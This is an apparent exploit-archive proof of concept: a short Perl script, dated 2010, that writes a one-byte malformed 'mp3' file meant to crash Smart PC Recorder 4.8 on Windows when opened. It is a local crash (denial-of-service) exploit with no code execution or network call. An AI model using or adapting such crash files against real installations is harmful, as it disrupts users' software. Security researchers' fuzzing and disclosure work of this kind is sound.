# Exploit Title: Smart PC Recorder .MP3 Local Crash POC
# Date: March 23, 2010
# Author: chap0
# Software Link: http://www.voiceemotion.com/smartrecorder.htm
# Version: Current Version: 4.8
# Tested on: Windows XP SP3/Windows 7
# Cost USD 19.95 

#!/usr/bin/perl

#Glory to God
#Won't Bow to Men, I Defy!

print "| Smart PC Recorder .mp3 Local Crash |\n";
print "| Current Version 4.8 Cost 19.95 USD |\n";
print "| Author: chap0                      |\n";
print "|        Always FUZZ IT OUT!         |\n";

my $ezA = "\x41";
my $file = "2ez.mp3";
open (FILE,">$file") or die "[!]Cannot open file";
print FILE "$ezA";
print "\n\tMP3 Created!\n"